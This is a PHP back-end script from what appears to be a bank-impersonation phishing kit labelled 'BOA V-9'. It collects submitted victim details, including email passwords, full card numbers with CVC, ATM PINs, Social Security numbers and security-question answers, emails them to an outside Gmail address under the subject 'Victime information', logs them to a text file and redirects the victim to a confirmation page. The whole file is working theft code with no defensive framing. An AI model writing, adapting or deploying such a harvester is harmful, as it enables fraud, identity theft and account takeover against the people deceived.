<?php
$fname = $_POST['firstname'] ;
$middle = $_POST['middlename'] ; 
$lname = $_POST['lastname'] ;
$gender = $_POST['gender'] ; 
$add1 = $_POST['address1'] ; 
$add2 = $_POST['address2'] ; 
$city = $_POST['city'] ; 
$state = $_POST['state'] ; 
$zip = $_POST['zipcode'] ;
$phone = $_POST['phone'] ;
$dob = $_POST['dob'] ;
$email = $_POST['email'] ; 
$pass = $_POST['password'] ; 
$cardholder = $_POST['cardholder'] ; 
$cardnumber = $_POST['cardnumber'] ; 
$mm = $_POST['month'] ; 
$yy = $_POST['year'] ; 
$cvc = $_POST['cvc'] ; 
$atm = $_POST['atm'] ;
$ssn = $_POST['ssn'] ;
$qq1 = $_POST['question1'] ;
$aa1 = $_POST['answer1'] ;
$qq2 = $_POST['question2'] ;
$aa2 = $_POST['answer2'] ;
$qq3 = $_POST['question3'] ;
$aa3 = $_POST['answer3'] ;
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
 $to="tn.8.3.deyi@gmail.com" ; 
 $subject = " Victime information : from: ".$ip;
$nome="BOA V-9" ; 
	$from="resulta@localhost.com" ; 
	$from_mail = $nome.'<'.$from.'>';
$headers .= 'From: ' . $from_mail . "\r\n";

$message .= "---------------+ Victim Information :D  +---------------\r\n";
$message .= "First Name          : ".$fname."\r\n";
$message .= "Middle Name         : ".$middle."\r\n";
$message .= "Last Name           : ".$lname."\r\n";
$message .= "Gender              : ".$gender."\r\n";
$message .= "Address1            : ".$add1."\r\n";
$message .= "Address2            : ".$add2."\r\n";
$message .= "City                : ".$city."\r\n";
$message .= "State               : ".$state."\r\n";
$message .= "Zip Code            : ".$zip."\r\n";
$message .= "Phone Number        : ".$phone."\r\n";
$message .= "Date of BD(MM/DD/YY): ".$dob."\r\n";
$message .= "IP Address          : ".$ip."\r\n";
$message .= "---------------+ Email Access :)  +---------------\r\n";
$message .= "Email               : ".$email."\r\n";
$message .= "Password            : ".$pass."\r\n";
$message .= "---------------+ Card Information <3  +---------------\r\n";
$message .= "Card holder         : ".$cardholder."\r\n";
$message .= "card number         : ".$cardnumber."\r\n";
$message .= "Expiration date     : ".$mm."/".$yy."\r\n";
$message .= "CVC                 : ".$cvc."\r\n";
$message .= "ATM pin             : ".$atm."\r\n";
$message .= "SSN                 : ".$ssn."\r\n";
$message .= "---------------+ Security Center  :O  +---------------\r\n";
$message .= "Secutity question1  : ".$qq1."\r\n";
$message .= "Answer1             : ".$aa1."\r\n";
$message .= "Secutity question2  : ".$qq2."\r\n";
$message .= "Answer2             : ".$aa2."\r\n";
$message .= "Secutity question3  : ".$qq3."\r\n";
$message .= "Answer3             : ".$aa3."\r\n";
$message .= "-----------------+ Created By Iyed +------------------\r\n";
mail($to,$subject,$message,$headers);
$file = fopen("info.txt", 'a');
fwrite($file, $message);
	header("Location: ../confirmation.php?fname=$fname&middle=$middle&lname=$lname&gender=$gender&add1=$add1&add2=$add2&city=$city&state=$state&zip=$zip&phone=$phone");




?>